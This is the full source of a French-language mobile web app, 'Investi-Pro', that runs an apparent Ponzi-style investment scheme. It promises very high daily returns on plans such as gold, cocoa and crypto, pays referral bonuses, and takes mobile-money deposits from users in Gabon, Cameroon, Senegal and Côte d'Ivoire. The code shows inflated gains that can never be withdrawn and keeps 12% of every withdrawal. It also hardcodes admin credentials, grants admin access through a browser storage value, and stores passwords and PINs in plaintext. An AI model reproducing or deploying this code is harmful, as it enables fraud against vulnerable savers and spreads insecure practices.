<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Investi-Pro | Officiel</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;700;800&family=Plus+Jakarta+Sans:wght@700&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

    <style>
        body { font-family: 'Outfit', sans-serif; background: #f8fafc; color: #0f172a; padding-bottom: 90px; -webkit-tap-highlight-color: transparent; }
        .font-heading { font-family: 'Plus Jakarta Sans', sans-serif; }
        
        /* UI Elements */
        .black-card {
            background: linear-gradient(135deg, #0f172a 0%, #334155 100%);
            border-radius: 24px; position: relative; overflow: hidden; color: white;
            box-shadow: 0 20px 40px -10px rgba(15, 23, 42, 0.4);
        }
        .btn-main {
            background: #0f172a; color: white; font-weight: 700; padding: 16px;
            border-radius: 16px; width: 100%; transition: 0.2s; display: block; text-align: center;
            box-shadow: 0 8px 20px rgba(15, 23, 42, 0.2);
        }
        .btn-main:active { transform: scale(0.96); }
        
        .input-std {
            background: #ffffff; border: 2px solid #e2e8f0; border-radius: 16px;
            width: 100%; padding: 16px; font-weight: 600; outline: none; font-size: 16px;
            transition: all 0.3s; color: #1e293b;
        }
        .input-std:focus { border-color: #0f172a; box-shadow: 0 0 0 4px rgba(15, 23, 42, 0.1); }

        /* Navigation */
        .nav-bar {
            position: fixed; bottom: 0; left: 0; right: 0; background: rgba(255,255,255,0.95);
            backdrop-filter: blur(12px); border-top: 1px solid #e2e8f0; height: 80px; display: flex;
            justify-content: space-around; align-items: center; z-index: 40;
            padding-bottom: env(safe-area-inset-bottom);
        }
        .nav-icon { color: #94a3b8; display: flex; flex-direction: column; align-items: center; font-size: 10px; font-weight: 700; width: 33%; transition: 0.3s; }
        .nav-icon i { font-size: 24px; margin-bottom: 4px; transition: 0.3s; }
        .nav-icon.active { color: #0f172a; }
        .nav-icon.active i { transform: translateY(-2px); }

        /* Telegram */
        .telegram-btn {
            position: fixed; bottom: 100px; right: 20px;
            background: #229ED9; color: white; width: 60px; height: 60px;
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            font-size: 28px; box-shadow: 0 10px 25px rgba(34, 158, 217, 0.4);
            z-index: 30; animation: pulse 2s infinite; cursor: pointer;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* Notifications */
        #toast-box { position: fixed; top: 20px; left: 20px; right: 20px; z-index: 9999; pointer-events: none; display: flex; flex-direction: column; gap: 10px; }
        .toast { background: white; color: #0f172a; padding: 16px; border-radius: 16px; box-shadow: 0 15px 30px -5px rgba(0,0,0,0.15); transform: translateY(-100%); opacity: 0; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); display: flex; align-items: center; gap: 12px; font-weight: 600; pointer-events: auto; border: 1px solid #f1f5f9; }
        .toast.show { transform: translateY(0); opacity: 1; }

        /* Modal Transitions (Fluide) */
        #modal { transition: opacity 0.3s ease; }
        #modal-content { transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        
        .fade-in { animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; } }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <div id="toast-box"></div>
    <a href="https://t.me/+A9ZIQNBWCZM4NzRk" target="_blank" class="telegram-btn"><i class="fab fa-telegram-plane"></i></a>

    <!-- MODAL (Bottom Sheet Style) -->
    <div id="modal" class="fixed inset-0 bg-slate-900/60 z-[60] hidden flex items-end sm:items-center justify-center opacity-0 pointer-events-none">
        <div id="modal-content" class="bg-white w-full max-w-md rounded-t-[2.5rem] sm:rounded-[2.5rem] max-h-[90vh] overflow-y-auto relative shadow-2xl transform translate-y-full">
            <!-- Contenu injecté par JS -->
        </div>
    </div>

    <!-- HEADER -->
    <header class="bg-white/80 backdrop-blur-md sticky top-0 z-40 px-6 py-4 border-b border-slate-100 flex justify-between items-center">
        <div class="flex items-center gap-3" onclick="app.nav('home')">
            <div class="bg-slate-900 text-white p-2.5 rounded-xl shadow-lg shadow-slate-900/20"><i class="fas fa-chart-pie text-lg"></i></div>
            <span class="font-heading font-extrabold text-xl tracking-tight">InvestiPro</span>
        </div>
        <div id="header-user"></div>
    </header>

    <main id="main-content" class="container mx-auto px-4 py-8 flex-grow"></main>

    <nav id="navbar" class="nav-bar hidden">
        <div onclick="app.nav('home')" class="nav-icon" id="nav-home"><i class="fas fa-home"></i>Accueil</div>
        <div onclick="app.nav('invest')" class="nav-icon" id="nav-invest">
            <div class="bg-slate-900 text-white w-14 h-14 rounded-2xl flex items-center justify-center -mt-10 border-[4px] border-[#f8fafc] shadow-xl"><i class="fas fa-rocket text-xl"></i></div>
        </div>
        <div onclick="app.nav('profile')" class="nav-icon" id="nav-profile"><i class="fas fa-user"></i>Profil</div>
    </nav>

    <script>
        const CONFIG = {
            firebase: {
                apiKey: "AIzaSyChwneppxshEKiaEgVXC9UOsRLrXayT7YE",
                authDomain: "investi-pro-f4ac0.firebaseapp.com",
                projectId: "investi-pro-f4ac0",
                storageBucket: "investi-pro-f4ac0.firebasestorage.app",
                messagingSenderId: "322552668380",
                appId: "1:322552668380:web:98c4ab7638102c36d75419"
            },
            invests: [
                {id:1, name:"Startups Tech", price:5000, daily:250, sponsor:15, desc:"Capital risque dans la tech."},
                {id:2, name:"Forex USD", price:10000, daily:600, sponsor:30, desc:"Trading haute fréquence."},
                {id:3, name:"Or Brut", price:25000, daily:1750, sponsor:75, desc:"Mines artisanales sécurisées."},
                {id:4, name:"Cacao Export", price:50000, daily:3750, sponsor:150, desc:"Exportation vers l'Europe."},
                {id:5, name:"Immobilier", price:100000, daily:8000, sponsor:300, desc:"Construction BTP."},
                {id:6, name:"Pétrole", price:150000, daily:12500, sponsor:450, desc:"Raffineries locales."},
                {id:7, name:"Diamant", price:200000, daily:17000, sponsor:600, desc:"Pierres précieuses certifiées."},
                {id:8, name:"Ferme Solaire", price:300000, daily:26000, sponsor:900, desc:"Énergie renouvelable."},
                {id:9, name:"Crypto Elite", price:500000, daily:45000, sponsor:1500, desc:"Staking ETH/BTC."}
            ],
            ops: ['Moov Money', 'Wave', 'Airtel', 'MTN', 'Orange']
        };

        const app = {
            user: null, db: null,
            
            init: function() {
                try {
                    firebase.initializeApp(CONFIG.firebase);
                    this.db = firebase.firestore();
                    firebase.auth().onAuthStateChanged(async u => {
                        if(u) {
                            const uid = localStorage.getItem('ip_v27_uid');
                            if(uid) await this.loadUser(uid); else this.nav('home');
                        } else {
                            firebase.auth().signInAnonymously();
                            this.nav('home');
                        }
                    });
                } catch(e) { alert("Erreur connexion"); }
            },

            toast: function(msg, type='success') {
                const b = document.getElementById('toast-box');
                const t = document.createElement('div');
                const icon = type==='error' ? 'times-circle text-red-500' : 'check-circle text-green-500';
                t.className = 'toast';
                t.innerHTML = `<i class="fas fa-${icon} text-2xl"></i><div>${msg}</div>`;
                b.appendChild(t);
                setTimeout(()=>t.classList.add('show'),10);
                setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),400)},3000);
            },

            openModal: function(html) {
                const m = document.getElementById('modal');
                const c = document.getElementById('modal-content');
                c.innerHTML = html;
                m.classList.remove('hidden');
                setTimeout(() => {
                    m.classList.remove('opacity-0');
                    m.classList.remove('pointer-events-none');
                    c.classList.remove('translate-y-full');
                }, 10);
            },

            closeModal: function() {
                const m = document.getElementById('modal');
                const c = document.getElementById('modal-content');
                c.classList.add('translate-y-full');
                m.classList.add('opacity-0');
                m.classList.add('pointer-events-none');
                setTimeout(() => m.classList.add('hidden'), 300);
            },

            nav: function(view) {
                this.view = view; window.scrollTo(0,0);
                const m = document.getElementById('main-content');
                const nav = document.getElementById('navbar');
                
                document.querySelectorAll('.nav-icon').forEach(e=>e.classList.remove('active'));
                const ab = document.getElementById('nav-'+view); if(ab) ab.classList.add('active');

                if(view === 'home') this.renderHome(m);
                else if(view === 'login') this.renderLogin(m);
                else if(view === 'register') this.renderRegister(m);
                else if(view === 'admin') this.renderAdmin(m);
                else {
                    if(!this.user) { this.nav('login'); return; }
                    if(this.user.isBlocked) { this.nav('home'); alert("Compte Bloqué"); return; }
                    nav.classList.remove('hidden');
                    document.getElementById('header-user').innerHTML = `<div class="flex items-center gap-2"><span class="text-xs font-bold bg-slate-100 px-3 py-1.5 rounded-xl">${this.user.firstName}</span><button onclick="app.logout()" class="text-slate-400 p-2"><i class="fas fa-power-off"></i></button></div>`;
                    if(view === 'profile') this.renderProfile(m);
                    if(view === 'invest') this.renderInvest(m);
                }

                if(!this.user && view !== 'admin') {
                    nav.classList.add('hidden');
                    document.getElementById('header-user').innerHTML = `<button onclick="app.nav('login')" class="text-xs font-bold bg-slate-900 text-white px-5 py-2.5 rounded-xl shadow-lg shadow-slate-900/20">Connexion</button>`;
                }
            },

            loadUser: async function(uid) {
                if(uid === 'ADMIN') { this.user={id:'ADMIN', role:'admin'}; this.nav('admin'); return; }
                const snap = await this.db.collection('users').where('id','==',uid).get();
                if(!snap.empty) {
                    const d = snap.docs[0];
                    this.user = { docId: d.id, ...d.data() };
                    localStorage.setItem('ip_v27_uid', uid);
                    this.db.collection('users').doc(d.id).onSnapshot(doc => {
                        this.user = { docId: doc.id, ...doc.data() };
                        if(this.view === 'profile') this.renderProfile(document.getElementById('main-content'));
                    });
                    this.nav('profile');
                }
            },

            // ACTIONS
            register: async function() {
                const ln=document.getElementById('r-ln').value, fn=document.getElementById('r-fn').value, ct=document.getElementById('r-ct').value, ph=document.getElementById('r-ph').value, pw=document.getElementById('r-pw').value, pin=document.getElementById('r-pin').value, sp=document.getElementById('r-sp').value;
                if(!ln||!fn||!ph||!pw||!pin) return this.toast("Champs manquants", "error");
                const chk = await this.db.collection('users').where('phone','==',ph).get();
                if(!chk.empty) return this.toast("Numéro déjà utilisé", "error");
                const uid = 'ID'+Math.floor(100000+Math.random()*900000);
                const user = { id: uid, lastName: ln, firstName: fn, country: ct, phone: ph, password: pw, secretCode: pin, balance: 0, role: 'user', referralCode: (ln.substring(0,3)+Math.floor(Math.random()*1000)).toUpperCase(), referralEarnings: 0, joined: new Date().toISOString(), isBlocked: false };
                if(sp) { const p=await this.db.collection('users').where('referralCode','==',sp).get(); if(!p.empty) user.sponsoredBy = p.docs[0].data().id; }
                await this.db.collection('users').add(user); await this.loadUser(uid); this.toast("Bienvenue !");
            },
            login: async function() {
                const ph=document.getElementById('l-ph').value, pw=document.getElementById('l-pw').value;
                if(ph==='076225865' && pw==='1705') { this.loadUser('ADMIN'); return; }
                let s = await this.db.collection('users').where('phone','==',ph).get();
                if(s.empty) { const all=await this.db.collection('users').get(); const f=all.docs.find(d=>d.data().lastName.toLowerCase()===ph.toLowerCase()); if(f) s={empty:false,docs:[f]}; }
                if(s.empty) return this.toast("Compte inconnu", "error");
                const u = s.docs[0].data();
                if(u.password !== pw) return this.toast("Mot de passe incorrect", "error");
                if(u.isBlocked) return this.toast("Compte bloqué", "error");
                this.loadUser(u.id); this.toast("Connexion réussie");
            },
            logout: function() { this.user=null; localStorage.removeItem('ip_v27_uid'); window.location.reload(); },

            tx: async function(type) {
                const amt=document.getElementById('tx-amt').value, op=document.getElementById('tx-op').value, ph=document.getElementById('tx-ph').value;
                if(!amt) return this.toast("Montant requis", "error");
                if(type==='withdraw') {
                    const pin=document.getElementById('tx-pin').value;
                    if(pin!==this.user.secretCode) return this.toast("Code PIN incorrect", "error");
                    if(this.user.balance < amt) return this.toast("Solde insuffisant", "error");
                    await this.db.collection('users').doc(this.user.docId).update({balance: this.user.balance - parseInt(amt)});
                }
                await this.db.collection('transactions').add({
                    userId: this.user.id, userName: this.user.lastName+' '+this.user.firstName, type: type, amount: parseInt(amt), net: type==='withdraw'?Math.floor(amt*0.88):parseInt(amt), operator: op, phone: ph, status: 'pending', date: new Date().toISOString(), userCountry: this.user.country
                });
                this.closeModal(); this.toast("Demande envoyée !", "success");
            },
            buy: async function(id) {
                const item = CONFIG.invests.find(x=>x.id===id);
                if(this.user.balance < item.price) return this.toast("Solde insuffisant", "error");
                await this.db.collection('users').doc(this.user.docId).update({balance: this.user.balance - item.price});
                await this.db.collection('investments').add({ userId: this.user.id, itemId: item.id, name: item.name, daily: item.daily, price: item.price, date: new Date().toISOString() });
                if(this.user.sponsoredBy) {
                    const p = await this.db.collection('users').where('id','==',this.user.sponsoredBy).get();
                    if(!p.empty) { const pd=p.docs[0]; await this.db.collection('users').doc(pd.id).update({ balance: (pd.data().balance||0)+item.sponsor, referralEarnings: (pd.data().referralEarnings||0)+item.sponsor }); }
                }
                this.closeModal(); this.toast("Succès ! Investissement actif."); this.nav('profile');
            },

            // ADMIN
            admAction: async function(tid, action, type, uid, amt) {
                await this.db.collection('transactions').doc(tid).update({status: action});
                if((action==='approved' && type==='deposit') || (action==='rejected' && type==='withdraw')) {
                    const u = await this.db.collection('users').where('id','==',uid).get();
                    if(!u.empty) await this.db.collection('users').doc(u.docs[0].id).update({balance: u.docs[0].data().balance + parseInt(amt)});
                }
                this.renderAdmin(document.getElementById('main-content'));
            },
            admBlock: async function(uid, state) {
                const u = await this.db.collection('users').where('id','==',uid).get();
                if(!u.empty) { await this.db.collection('users').doc(u.docs[0].id).update({isBlocked: !state}); this.renderAdmin(document.getElementById('main-content')); }
            },

            // RENDERERS
            renderHome: function(el) { el.innerHTML = `<div class="text-center mt-10 fade-in"><h1 class="text-4xl font-display font-extrabold text-slate-900 mb-4 leading-tight">Faites fructifier <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-green-600 to-emerald-600">Votre Capital</span></h1><p class="text-slate-600 mb-10 text-lg">Plateforme n°1 d'investissement sécurisé.</p>${!this.user?`<div class="space-y-4 px-8"><button onclick="app.nav('register')" class="btn-main text-lg shadow-xl">Créer un compte</button><button onclick="app.nav('login')" class="w-full py-4 border-2 border-slate-200 rounded-2xl font-bold text-slate-600 text-lg">Se connecter</button></div>`:`<button onclick="app.nav('invest')" class="btn-main mx-auto w-56 text-lg shadow-xl">Voir les offres</button>`}</div>`; },
            renderLogin: function(el) { el.innerHTML = `<div class="max-w-md mx-auto pt-10 fade-in"><h2 class="text-3xl font-bold mb-8 text-slate-900">Connexion</h2><input id="l-ph" class="input-std mb-4" placeholder="Téléphone"><input id="l-pw" type="password" class="input-std mb-8" placeholder="Mot de passe"><button onclick="app.login()" class="btn-main shadow-xl text-lg">Se connecter</button></div>`; },
            renderRegister: function(el) { el.innerHTML = `<div class="max-w-md mx-auto fade-in"><h2 class="text-3xl font-bold mb-8 text-slate-900">Inscription</h2><div class="flex gap-4 mb-4"><input id="r-ln" class="input-std w-1/2" placeholder="Nom"><input id="r-fn" class="input-std w-1/2" placeholder="Prénom"></div><select id="r-ct" class="input-std mb-4"><option>Gabon</option><option>Cameroun</option><option>Sénégal</option><option>Côte d'Ivoire</option></select><input id="r-ph" type="tel" class="input-std mb-4" placeholder="Numéro"><input id="r-pw" type="password" class="input-std mb-4" placeholder="Mot de passe"><div class="bg-yellow-50 p-4 rounded-2xl border border-yellow-200 mb-4"><label class="text-xs font-bold text-yellow-800 mb-2 block">PIN Retrait (4 chiffres)</label><input id="r-pin" type="number" class="input-std text-center tracking-[0.5em] font-bold text-lg border-none" placeholder="0000" maxlength="4"></div><input id="r-sp" class="input-std mb-8 text-center uppercase border-dashed" placeholder="Code Parrain (Optionnel)"><button onclick="app.register()" class="btn-main shadow-xl text-lg">S'inscrire</button></div>`; },
            renderProfile: async function(el) {
                const u = this.user;
                const myInvs = (await this.db.collection('investments').where('userId','==',u.id).get()).docs.map(d=>d.data());
                const refs = (await this.db.collection('users').where('sponsoredBy','==',u.id).get()).docs.map(d=>d.data());
                const txs = (await this.db.collection('transactions').where('userId','==',u.id).limit(10).get()).docs.map(d=>d.data()).sort((a,b)=>new Date(b.date)-new Date(a.date));
                let gains = 0; const now = new Date();
                const items = myInvs.map(i => { const d=Math.floor((now-new Date(i.date))/86400000);const act=d<30;if(act)gains+=d*i.daily;return{...i,d,act}});

                el.innerHTML = `<div class="fade-in">
                    <div class="black-card p-8 mb-8 h-64 flex flex-col justify-between"><div class="flex justify-between items-start"><span class="text-sm opacity-70 tracking-widest uppercase">${u.country}</span><span class="font-mono text-sm opacity-60">ID: ${u.id}</span></div><div class="text-center"><div class="text-sm opacity-60 mb-2">Solde Total</div><div class="text-5xl font-mono font-bold tracking-tight">${(u.balance+gains).toLocaleString()} F</div></div><div class="font-bold uppercase tracking-wide">${u.lastName} ${u.firstName}</div></div>
                    <div class="grid grid-cols-2 gap-4 mb-10"><button onclick="app.showWallet('deposit')" class="bg-white border p-5 rounded-2xl shadow-sm font-bold text-green-700 text-lg">Dépôt</button><button onclick="app.showWallet('withdraw')" class="bg-white border p-5 rounded-2xl shadow-sm font-bold text-slate-700 text-lg">Retrait</button></div>
                    <div class="bg-white p-6 rounded-3xl border shadow-sm mb-10"><div class="flex justify-between items-center mb-4"><h3 class="font-bold text-lg">Parrainage</h3><span class="bg-slate-100 px-3 py-1 rounded-lg font-mono text-sm font-bold">${u.referralCode}</span></div><div class="grid grid-cols-2 gap-4 text-center mb-4"><div class="bg-slate-50 p-3 rounded-xl"><div class="text-xs text-slate-400 font-bold uppercase">Gains</div><div class="text-xl font-bold text-green-600">${(u.referralEarnings||0).toLocaleString()}</div></div><div class="bg-slate-50 p-3 rounded-xl"><div class="text-xs text-slate-400 font-bold uppercase">Filleuls</div><div class="text-xl font-bold text-slate-800">${refs.length}</div></div></div><div class="border-t pt-3 max-h-32 overflow-y-auto space-y-2">${refs.map(r=>`<div class="flex justify-between text-sm"><span>${r.firstName} ${r.lastName}</span><span class="text-slate-400">Inscrit</span></div>`).join('')||'<div class="text-center text-sm text-slate-400">Aucun filleul</div>'}</div></div>
                    <h3 class="font-bold text-xl mb-4 px-2">Mes Investissements</h3><div class="space-y-4 mb-10">${items.length?items.map(i=>`<div class="bg-white p-5 rounded-2xl border shadow-sm flex justify-between items-center ${!i.act?'opacity-50':''}"><div class="font-bold">${i.name}</div><div class="text-right"><div class="font-bold text-green-600">+${i.daily} F/j</div><div class="text-xs text-slate-400 uppercase font-bold mt-1">${i.act?'En cours':'Terminé'}</div></div></div>`).join(''):'<div class="text-center py-6 text-slate-400">Aucun investissement</div>'}</div>
                    <h3 class="font-bold text-xl mb-4 px-2">Historique</h3><div class="space-y-3 pb-24">${txs.map(t=>`<div class="bg-white p-4 rounded-2xl border flex justify-between items-center"><div><div class="font-bold text-sm uppercase text-slate-600">${t.type}</div><div class="text-xs text-slate-400">${new Date(t.date).toLocaleDateString()}</div></div><div class="text-right font-bold ${t.type==='deposit'||t.type==='bonus'?'text-green-600':'text-slate-800'}">${t.amount.toLocaleString()} F</div></div>`).join('')}</div>
                </div>`;
            },
            renderInvest: function(el) {
                el.innerHTML = `<div class="fade-in pb-24"><h2 class="font-bold text-2xl mb-6 px-2">Opportunités</h2><div class="grid gap-5">${CONFIG.invests.map(i=>`<div onclick="app.showInvest(${i.id})" class="bg-white p-5 rounded-3xl border shadow-sm flex items-center gap-5 active:scale-95 transition"><div class="w-14 h-14 rounded-2xl ${i.bg} ${i.color} flex items-center justify-center text-2xl"><i class="fas ${i.icon}"></i></div><div class="flex-1"><div class="flex justify-between items-center mb-1"><span class="font-bold text-lg text-slate-900">${i.name}</span><span class="text-[10px] bg-green-100 text-green-800 px-2 py-1 rounded-lg font-bold">${i.trend}</span></div><div class="text-sm font-bold text-slate-500">${i.price.toLocaleString()} F <span class="text-green-600 ml-2">+${i.daily}/j</span></div></div></div>`).join('')}</div></div>`;
            },
            renderAdmin: async function(el) {
                const us = (await this.db.collection('users').get()).docs.map(d=>({docId:d.id,...d.data()})).filter(x=>x.id!=='ADMIN');
                const tx = (await this.db.collection('transactions').get()).docs.map(d=>({docId:d.id,...d.data()}));
                const pen = tx.filter(t=>t.status==='pending');
                
                const tFund = us.reduce((a,b)=>a+(b.balance||0),0);
                const tFees = tx.filter(t=>t.type==='withdraw'&&t.status==='approved').reduce((a,b)=>a+(b.amount-b.net),0);
                const tOut = tx.filter(t=>t.type==='withdraw'&&t.status==='approved').reduce((a,b)=>a+b.amount,0);

                el.innerHTML = `<div class="fade-in pb-24"><div class="bg-slate-900 text-white p-6 rounded-b-[3rem] -mt-6 -mx-4 mb-8 shadow-xl"><div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold">Admin</h2><button onclick="app.logout()" class="text-xs bg-red-600 px-4 py-2 rounded-full">Quitter</button></div><div class="bg-green-900/50 border border-green-500/30 p-4 rounded-2xl mb-6 flex justify-between items-center"><span class="uppercase text-xs font-bold opacity-70">Bénéfices (12%)</span><span class="text-2xl font-mono font-bold text-green-400">+${tFees.toLocaleString()} F</span></div><div class="grid grid-cols-3 gap-4 text-center mb-6"><div class="bg-white/10 p-3 rounded-xl"><div>Clients</div><div class="font-bold text-lg">${us.length}</div></div><div class="bg-white/10 p-3 rounded-xl"><div>Fonds</div><div class="font-bold text-lg text-blue-300">${tFund.toLocaleString()}</div></div><div class="bg-white/10 p-3 rounded-xl"><div>Sorti</div><div class="font-bold text-lg text-red-300">${tOut.toLocaleString()}</div></div></div></div>
                <h3 class="font-bold text-lg mb-4 px-2">Validations (${pen.length})</h3><div class="space-y-4 mb-10">${pen.map(t=>{const u=us.find(x=>x.id===t.userId);return `<div class="bg-white p-5 rounded-2xl border-l-4 ${t.type==='deposit'?'border-green-500':'border-red-500'} shadow-sm"><div class="flex justify-between font-bold text-lg mb-1"><span>${t.userName}</span><span>${t.amount.toLocaleString()} F</span></div><div class="text-sm text-slate-500 mb-2"><div class="font-bold">${t.operator}</div><div>${u?u.country:'?'} • ${t.phone}</div>${t.type==='withdraw'?`<div class="text-red-600 font-bold mt-1">Net: ${t.net.toLocaleString()} F</div>`:''}</div><div class="flex gap-3"><button onclick="app.admAction('${t.docId}','approved','${t.type}','${t.userId}','${t.amount}')" class="bg-green-600 text-white px-4 py-3 rounded-xl font-bold text-xs flex-1 shadow-lg shadow-green-600/30">VALIDER</button><button onclick="app.admAction('${t.docId}','rejected','${t.type}','${t.userId}','${t.amount}')" class="bg-slate-100 text-slate-600 px-4 py-3 rounded-xl font-bold text-xs flex-1">REFUSER</button></div></div>`}).join('')||'<div class="text-center text-slate-400 py-6 border-dashed border-2 rounded-xl">Rien à valider</div>'}</div>
                <h3 class="font-bold text-lg mb-4 px-2">Clients</h3><div class="space-y-3">${us.map(u=>`<div class="bg-white p-4 rounded-2xl border shadow-sm flex justify-between items-center"><div><div class="font-bold text-slate-900">${u.lastName} ${u.firstName}</div><div class="text-sm text-slate-500 mt-1">${u.phone}</div></div><button onclick="app.admBlock('${u.id}',${u.isBlocked})" class="px-4 py-2 rounded-xl font-bold text-xs ${u.isBlocked?'bg-red-100 text-red-700':'bg-slate-100 text-slate-600'}">${u.isBlocked?'Bloqué':'Actif'}</button></div>`).join('')}</div></div>`;
            },
            
            // HELPERS UI
            showWallet: function(type) {
                const isDep = type==='deposit';
                this.openModal(`
                    <div class="pt-2 pb-6 px-2">
                        <div class="flex justify-between items-center mb-6">
                            <h3 class="text-2xl font-bold text-slate-900">${isDep?'Dépôt':'Retrait'}</h3>
                            <button onclick="app.closeModal()" class="bg-slate-100 p-2 rounded-full hover:bg-slate-200 transition"><i class="fas fa-times text-slate-500 text-lg"></i></button>
                        </div>
                        ${isDep ? `<div class="bg-blue-50 p-4 rounded-2xl mb-6 text-xs font-bold text-blue-800 flex items-start gap-3"><i class="fas fa-info-circle text-lg mt-0.5"></i> Ne quittez pas cette page ! Validez le paiement sur votre téléphone.</div>` : ``}
                        <select id="tx-op" class="input-std mb-4">${CONFIG.ops.map(o=>`<option>${o}</option>`).join('')}</select>
                        <input id="tx-ph" value="${this.user.phone}" class="input-std mb-4" placeholder="Numéro">
                        <input id="tx-amt" type="number" class="input-std mb-4" placeholder="Montant (FCFA)" oninput="document.getElementById('calc').innerText=Math.floor(this.value*0.88)+' F'">
                        ${!isDep ? `<div class="flex justify-between text-sm font-bold text-green-600 mb-4 px-2"><span>Net à recevoir :</span><span id="calc">0 F</span></div><input id="tx-pin" type="password" class="input-std mb-6 text-center tracking-[0.5em]" placeholder="CODE PIN" maxlength="4">` : ''}
                        <button onclick="app.tx('${type}')" class="btn-main shadow-xl">Confirmer</button>
                    </div>
                `);
            },
            showInvest: function(id) {
                const i = CONFIG.invests.find(x=>x.id===id);
                this.openModal(`
                    <div class="pb-6">
                        <div class="h-48 ${i.bg} flex items-center justify-center relative overflow-hidden rounded-3xl mb-6"><i class="fas ${i.icon} text-8xl ${i.color} opacity-80 transform scale-125"></i><button onclick="app.closeModal()" class="absolute top-4 right-4 bg-white/90 p-2 rounded-full hover:bg-white transition shadow-lg"><i class="fas fa-times text-lg"></i></button></div>
                        <div class="px-2">
                            <div class="flex justify-between items-start mb-2"><div><h3 class="text-2xl font-bold text-slate-900 font-heading">${i.name}</h3><span class="text-sm font-bold text-slate-500">${i.type}</span></div><span class="bg-green-100 text-green-700 px-3 py-1 rounded-full font-bold text-sm">${i.trend}</span></div>
                            <p class="text-slate-600 mb-6 leading-relaxed">${i.desc}</p>
                            <div class="grid grid-cols-2 gap-4 mb-8"><div class="p-4 rounded-2xl bg-slate-50 border border-slate-200"><div class="text-xs text-slate-400 font-bold uppercase">Prix</div><div class="font-bold text-lg text-slate-800">${i.price.toLocaleString()} F</div></div><div class="p-4 rounded-2xl bg-green-50 border border-green-200"><div class="text-xs text-green-600 font-bold uppercase">Gain / Jour</div><div class="font-bold text-lg text-green-700">+${i.daily} F</div></div></div>
                            <button onclick="app.buy(${i.id})" class="btn-main shadow-xl py-4 text-lg">Investir Maintenant</button>
                        </div>
                    </div>
                `);
            },
        };

        window.onload = app.init.bind(app);
    </script>
</body>
</html>


